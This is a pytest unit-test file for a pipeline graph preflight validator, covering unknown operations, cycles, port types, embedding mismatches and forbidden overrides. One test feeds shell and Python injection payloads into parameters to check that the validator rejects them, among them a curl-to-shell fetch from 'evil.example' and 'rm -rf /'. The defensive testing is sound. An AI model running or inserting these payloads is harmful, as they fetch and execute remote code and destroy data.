"""Task 2.3: graph preflight rejects invalid work before any side effect."""

from __future__ import annotations

from typing import Any

import pytest
from tests.unit.test_pipeline_support import (
    HOST_EMBEDDING,
    ReaderParams,
    fixture_catalogue,
    fixture_host,
    ingest_graph,
    noop_adapter,
    search_graph,
)

from omrg.core.pipelines import (
    EffectClass,
    EmbeddingRef,
    HostContext,
    HostOptionSet,
    IssueCode,
    OperationCatalogue,
    OperationDescriptor,
    PipelineValidationError,
    parse_definition,
    preflight,
    validate_pipeline,
)


def _codes(data: dict[str, Any], **host_kwargs: Any) -> list[str]:
    report = preflight(
        parse_definition(data), fixture_catalogue(), host=fixture_host(**host_kwargs)
    )
    return [issue.code for issue in report.issues]


def _issues(data: dict[str, Any], **host_kwargs: Any):
    return preflight(
        parse_definition(data), fixture_catalogue(), host=fixture_host(**host_kwargs)
    ).issues


def _edge(src: str, sport: str, dst: str, dport: str) -> dict[str, Any]:
    return {"source": {"node": src, "port": sport}, "target": {"node": dst, "port": dport}}


def test_valid_graphs_pass() -> None:
    """The fixture search and ingestion graphs are valid."""
    assert _codes(search_graph()) == []
    assert _codes(ingest_graph()) == []


def test_report_resolves_versions_and_topological_order() -> None:
    """A passing report records resolved versions and an execution order."""
    report = preflight(parse_definition(search_graph()), fixture_catalogue(), host=fixture_host())
    assert report.ok
    assert report.resolved_versions["rerank"] == 1
    order = list(report.order)
    assert order.index("fuse") > order.index("dense")
    assert order.index("answer") > order.index("context")


def test_validate_pipeline_raises_with_all_issues() -> None:
    """``validate_pipeline`` raises one error listing every problem."""
    data = search_graph()
    data["nodes"].append({"id": "mystery", "operation": "retrieve.telepathy"})
    data["edges"].pop(0)
    with pytest.raises(PipelineValidationError) as excinfo:
        validate_pipeline(parse_definition(data), fixture_catalogue(), host=fixture_host())
    assert IssueCode.UNKNOWN_OPERATION in excinfo.value.codes


def test_unknown_operation_names_node() -> None:
    """Unknown operation types name the offending node."""
    data = search_graph()
    data["nodes"][0]["operation"] = "retrieve.telepathy"
    issues = _issues(data)
    assert issues[0].code == IssueCode.UNKNOWN_OPERATION
    assert issues[0].node_id == "dense"


def test_unknown_operation_version() -> None:
    """A pinned version that is not registered is rejected."""
    data = search_graph()
    data["nodes"][0]["version"] = 7
    assert IssueCode.UNKNOWN_OPERATION_VERSION in _codes(data)


def test_duplicate_node_ids() -> None:
    """Node identifiers are unique."""
    data = search_graph()
    data["nodes"].append({"id": "dense", "operation": "retrieve.dense"})
    assert IssueCode.DUPLICATE_NODE in _codes(data)


def test_edge_to_unknown_node_or_port() -> None:
    """Edges must reference declared nodes and ports."""
    data = search_graph()
    data["edges"].append(_edge("ghost", "evidence", "fuse", "ranked"))
    data["edges"].append(_edge("dense", "nonsense", "fuse", "ranked"))
    codes = _codes(data)
    assert IssueCode.UNKNOWN_NODE in codes
    assert IssueCode.UNKNOWN_PORT in codes


def test_invalid_parameters_name_node() -> None:
    """Parameter schemas are enforced, including unknown keys."""
    data = search_graph()
    data["nodes"][0]["params"] = {"top_k": 0, "temperature": 2}
    issues = [i for i in _issues(data) if i.code == IssueCode.INVALID_PARAMETER]
    assert {i.node_id for i in issues} == {"dense"}
    assert len(issues) == 2


def test_missing_required_input() -> None:
    """A required input port without a connection is named."""
    data = search_graph()
    data["edges"] = [e for e in data["edges"] if e["target"]["node"] != "context"]
    issues = [i for i in _issues(data) if i.code == IssueCode.MISSING_INPUT]
    assert issues and issues[0].node_id == "context" and issues[0].port == "evidence"


def test_ambiguous_single_input_wiring() -> None:
    """Two connections into a single-cardinality port are ambiguous."""
    data = search_graph()
    data["edges"].append(_edge("dense", "evidence", "rerank", "evidence"))
    issues = [i for i in _issues(data) if i.code == IssueCode.AMBIGUOUS_INPUT]
    assert issues and issues[0].node_id == "rerank"


def test_graph_input_and_edge_on_same_single_port_is_ambiguous() -> None:
    """A graph input cannot share a single port with an edge."""
    data = search_graph()
    data["edges"].append(_edge("context", "context", "answer", "query"))
    assert IssueCode.AMBIGUOUS_INPUT in _codes(data) or IssueCode.INCOMPATIBLE_PORTS in _codes(data)


def test_incompatible_connection_names_edge() -> None:
    """Fused scores cannot feed a dense-similarity threshold."""
    data = search_graph()
    data["nodes"].append({"id": "threshold", "operation": "select.dense_threshold"})
    data["edges"].append(_edge("fuse", "evidence", "threshold", "evidence"))
    issues = [i for i in _issues(data) if i.code == IssueCode.INCOMPATIBLE_PORTS]
    assert issues and issues[0].edge == "fuse.evidence->threshold.evidence"
    assert "rrf_v1" in issues[0].message


def test_cycle_is_rejected() -> None:
    """Feedback loops are not executable."""
    data = search_graph()
    data["nodes"].append({"id": "rerank2", "operation": "select.rerank"})
    data["edges"].append(_edge("rerank", "evidence", "rerank2", "evidence"))
    data["edges"].append(_edge("rerank2", "evidence", "fuse", "ranked"))
    issues = [i for i in _issues(data) if i.code == IssueCode.CYCLE]
    assert issues
    assert "fuse" in issues[0].message and "rerank2" in issues[0].message


def test_executable_parameter_text_rejected() -> None:
    """Python expressions and shell commands in parameters are rejected."""
    for payload in (
        "__import__('os').system('id')",
        "$(curl evil.example | sh)",
        "lambda x: x",
        "`rm -rf /`",
    ):
        data = ingest_graph()
        data["nodes"][2]["params"] = {"separator": payload}
        assert IssueCode.EXECUTABLE_TEXT in _codes(data), payload


def test_executable_operation_text_rejected() -> None:
    """An expression in place of an operation name is executable text."""
    data = search_graph()
    data["nodes"][0]["operation"] = "eval('1+1')"
    assert _codes(data)[0] == IssueCode.EXECUTABLE_TEXT


def test_free_text_parameters_are_data() -> None:
    """Declared free-text parameters may mention code without rejection."""
    data = search_graph()
    data["nodes"][5]["params"] = {"instructions": "Explain what `import os` does."}
    assert _codes(data) == []


def test_capability_unavailable_names_reason() -> None:
    """Missing resources fail preflight with the host's reason."""
    caps = {"embedder": None, "store": None, "sparse_backend": None, "completion": None}
    caps["reranker"] = "Reranker model is not installed."
    issues = [
        i
        for i in _issues(search_graph(), capabilities=caps)
        if i.code == IssueCode.CAPABILITY_UNAVAILABLE
    ]
    assert issues[0].node_id == "rerank"
    assert "not installed" in issues[0].message


def test_disabled_node_with_valid_bypass_passes() -> None:
    """A disabled reranker passes ranked evidence through."""
    data = search_graph()
    data["nodes"][3]["enabled"] = False
    caps = {"embedder": None, "store": None, "sparse_backend": None, "completion": None}
    assert _codes(data, capabilities=caps) == []


def test_disabled_node_without_bypass_rejected() -> None:
    """An operation without a declared bypass cannot be disabled."""
    data = ingest_graph()
    data["nodes"][3]["enabled"] = False
    issues = [i for i in _issues(data) if i.code == IssueCode.INVALID_BYPASS]
    assert issues and issues[0].node_id == "embed"


def test_bypass_type_flows_from_upstream() -> None:
    """A bypassed node forwards its upstream type, checked downstream."""
    data = search_graph()
    data["nodes"].append({"id": "threshold", "operation": "select.dense_threshold"})
    data["nodes"][3]["enabled"] = False
    data["edges"].append(_edge("rerank", "evidence", "threshold", "evidence"))
    # rerank is bypassed, so threshold would receive fused RRF scores.
    issues = [
        i
        for i in _issues(data)
        if i.code in {IssueCode.INVALID_BYPASS, IssueCode.INCOMPATIBLE_PORTS}
    ]
    assert issues and issues[0].edge == "rerank.evidence->threshold.evidence"


def test_embedding_identity_mismatch_with_equal_dimensions() -> None:
    """Different models with equal dimensions are still incompatible."""
    other = EmbeddingRef(
        provider="llamacpp", model="other-model", dimensions=HOST_EMBEDDING.dimensions
    )
    issues = [
        i
        for i in _issues(search_graph(), identities={"documents": other})
        if i.code == IssueCode.EMBEDDING_IDENTITY_MISMATCH
    ]
    assert issues and issues[0].node_id == "dense"
    assert "other-model" in issues[0].message and "dimension" in issues[0].message


def test_embedding_identity_mismatch_for_commit() -> None:
    """Commits into a collection owned by another provider are rejected."""
    other = EmbeddingRef(provider="openrouter", model="qwen3-embedding", dimensions=1024)
    codes = _codes(ingest_graph(), identities={"documents": other})
    assert IssueCode.EMBEDDING_IDENTITY_MISMATCH in codes


def test_matching_or_new_collection_identity_passes() -> None:
    """Matching and not-yet-created collections are both accepted."""
    assert _codes(search_graph(), identities={"documents": HOST_EMBEDDING}) == []
    assert _codes(search_graph(), identities={}) == []


def _two_commits(second_collection: str) -> dict[str, Any]:
    data = ingest_graph()
    data["nodes"].append(
        {"id": "commit2", "operation": "commit.source", "params": {"collection": second_collection}}
    )
    data["edges"].append(_edge("embed", "chunks", "commit2", "chunks"))
    return data


def test_conflicting_commits_same_collection() -> None:
    """Two commits mutating the same source and collection conflict."""
    issues = [
        i for i in _issues(_two_commits("documents")) if i.code == IssueCode.CONFLICTING_COMMIT
    ]
    assert issues and "documents" in issues[0].message


def test_multiple_commit_destinations_rejected_initially() -> None:
    """Only one commit destination per ingestion recipe is allowed initially."""
    assert IssueCode.MULTIPLE_COMMIT_DESTINATIONS in _codes(_two_commits("other"))


@pytest.mark.parametrize(
    ("lever", "value", "code"),
    [
        ("embed_model", "other", IssueCode.HOST_OWNED_SETTING),
        ("openrouter_api_key", "sk-x", IssueCode.HOST_OWNED_SETTING),
        ("lancedb_uri", "/tmp/x", IssueCode.HOST_OWNED_SETTING),
        ("retrieval.rerank_model", "x", IssueCode.HOST_OWNED_SETTING),
        ("pdf_reader", "pypdf", IssueCode.HOST_OWNED_SETTING),
        ("retrieval.top_k", "ten", IssueCode.INVALID_OVERRIDE),
        ("retrieval.top_k", 0, IssueCode.INVALID_OVERRIDE),
        ("retrieval.made_up", 1, IssueCode.INVALID_OVERRIDE),
    ],
)
def test_graph_overrides_outside_allowed_levers(lever: str, value: Any, code: str) -> None:
    """Graph-wide overrides accept only documented operation levers."""
    data = search_graph()
    data["overrides"] = {lever: value}
    issues = [i for i in _issues(data) if i.code == code]
    assert issues and issues[0].lever == lever


def test_pdf_reader_override_points_to_the_read_document_step() -> None:
    """A graph-wide reader override is refused with the step to use instead."""
    data = search_graph()
    data["overrides"] = {"pdf_reader": "pypdf"}
    issues = [i for i in _issues(data) if i.code == IssueCode.HOST_OWNED_SETTING]
    assert issues and "Read document step" in issues[0].message
    other = search_graph()
    other["overrides"] = {"embed_model": "x"}
    assert "Read document step" not in _issues(other)[0].message


@pytest.mark.parametrize("profile", ["hybrid", "research"])
def test_unsupported_graph_profile(profile: str) -> None:
    """``hybrid`` is a server selector, not an operational graph profile."""
    data = search_graph()
    data["profile"] = profile
    issues = [i for i in _issues(data) if i.code == IssueCode.UNSUPPORTED_PROFILE]
    assert issues and "documents" in issues[0].message


def test_graph_output_must_reference_output_port() -> None:
    """Graph outputs must name a declared output port."""
    data = search_graph()
    data["outputs"][0]["source"]["port"] = "nowhere"
    assert IssueCode.UNKNOWN_PORT in _codes(data)


def test_runtime_inputs_checked_when_supplied() -> None:
    """Supplied run inputs must match the declared graph inputs."""
    definition = parse_definition(search_graph())
    report = preflight(
        definition, fixture_catalogue(), host=fixture_host(), inputs={"question": "hi"}
    )
    codes = {i.code for i in report.issues}
    assert codes == {IssueCode.MISSING_GRAPH_INPUT, IssueCode.UNKNOWN_GRAPH_INPUT}


def test_preflight_runs_no_adapter() -> None:
    """Validation never calls an adapter, even when the graph is invalid."""
    from tests.unit.test_pipeline_support import fixture_descriptors

    from omrg.core.pipelines import OperationCatalogue

    calls: list[str] = []

    async def recording(context: Any, inputs: Any, params: Any) -> Any:
        calls.append("called")

    catalogue = OperationCatalogue()
    for descriptor in fixture_descriptors():
        catalogue.register(descriptor, recording)
    data = search_graph()
    data["edges"].pop()
    preflight(parse_definition(data), catalogue, host=fixture_host())
    preflight(parse_definition(search_graph()), catalogue, host=fixture_host())
    assert calls == []


def test_structural_validation_without_host() -> None:
    """Without a host, structural checks still run and resource checks are skipped."""
    data = search_graph()
    data["edges"].pop()
    report = preflight(parse_definition(data), fixture_catalogue())
    assert [i.code for i in report.issues] == [IssueCode.MISSING_INPUT]


# ── Option availability ──────────────────────────────────────────────


def _reader_catalogue() -> OperationCatalogue:
    catalogue = OperationCatalogue()
    catalogue.register(
        OperationDescriptor(
            operation_id="read.example",
            version=1,
            title="Read",
            family="read",
            parameters=ReaderParams,
            effect=EffectClass.PURE,
            option_params={"reader": "reader"},
        ),
        noop_adapter,
    )
    return catalogue


def _reader_graph(reader: str | None, *, enabled: bool = True) -> Any:
    node: dict[str, Any] = {"id": "read", "operation": "read.example", "enabled": enabled}
    if reader is not None:
        node["params"] = {"reader": reader}
    return parse_definition({"schema_version": 1, "nodes": [node], "edges": []})


def _reader_host() -> HostContext:
    return HostContext(
        options={
            "reader": HostOptionSet(inherited="alpha", unavailable={"beta": "beta is missing"})
        }
    )


def test_unavailable_option_value_is_refused() -> None:
    """A node that selects a choice the host cannot run gets a named issue."""
    report = preflight(_reader_graph("beta"), _reader_catalogue(), host=_reader_host())
    issues = [i for i in report.issues if i.code == IssueCode.OPTION_UNAVAILABLE]
    assert [i.node_id for i in issues] == ["read"]
    assert "beta" in issues[0].message
    assert "beta is missing" in issues[0].message


def test_null_option_value_gives_no_issue() -> None:
    """``None`` inherits the host value, so nothing can be unavailable."""
    report = preflight(_reader_graph(None), _reader_catalogue(), host=_reader_host())
    assert IssueCode.OPTION_UNAVAILABLE not in [i.code for i in report.issues]


def test_available_option_value_and_disabled_node_give_no_issue() -> None:
    """Available choices pass, and a disabled node is not checked."""
    available = preflight(_reader_graph("alpha"), _reader_catalogue(), host=_reader_host())
    assert IssueCode.OPTION_UNAVAILABLE not in [i.code for i in available.issues]
    disabled = preflight(
        _reader_graph("beta", enabled=False), _reader_catalogue(), host=_reader_host()
    )
    assert IssueCode.OPTION_UNAVAILABLE not in [i.code for i in disabled.issues]


def test_option_check_is_skipped_without_a_host() -> None:
    """Draft preflight has no host, so it gives structural feedback only."""
    report = preflight(_reader_graph("beta"), _reader_catalogue(), host=None)
    assert IssueCode.OPTION_UNAVAILABLE not in [i.code for i in report.issues]
